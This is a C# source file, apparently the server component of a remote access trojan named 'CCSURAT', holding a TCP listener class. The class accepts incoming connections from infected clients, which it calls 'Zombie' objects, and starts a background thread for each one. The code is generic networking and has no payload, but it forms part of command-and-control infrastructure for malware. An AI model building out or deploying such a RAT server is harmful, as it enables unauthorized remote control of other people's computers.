using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace CCSURAT_Server
{
    class Listener
    {

        // Store main form for its console
        private ServerMainForm mainForm;
        private List<Zombie> zombies;

        TcpListener listener;

        private Boolean isListening;

        public int port;

        public Listener(ServerMainForm form, List<Zombie> zombies, int port)
        {
            this.mainForm = form;
            this.zombies = zombies;
            this.port = port;
            listener = new TcpListener(IPAddress.Any, port);
            isListening = true;
            Log("Listener initialized.");
        }

        // Listens to incoming client connections and spawns a new client "Zombie" object
        // when a pending connection is detected.
        public void Listen()
        {
            try {
                listener.Start();
                while (isListening)
                {
                    if (listener.Pending())
                    {
                        TcpClient client = listener.AcceptTcpClient();
                        Log("Accepted Client Connection");
                        Zombie zombie = new Zombie(mainForm, client);
                        zombies.Add(zombie);
                        Thread zombieThread = new Thread(new ThreadStart(zombie.ListenForData));
                        zombieThread.IsBackground = true;
                        zombieThread.Start();
                        mainForm.UpdateStatus();
                    }
                    // Need to test this sleep, see if it messes up communication.
                    // Using this due to high CPU usage on server.
                    Thread.Sleep(100);
                }
            }catch(Exception ex)
            {
                Log("Listener error: " + ex.ToString());
            }
        }

        private void Log(string s)
        {
            mainForm.Log(s);
            Console.WriteLine();
        }
    }
}
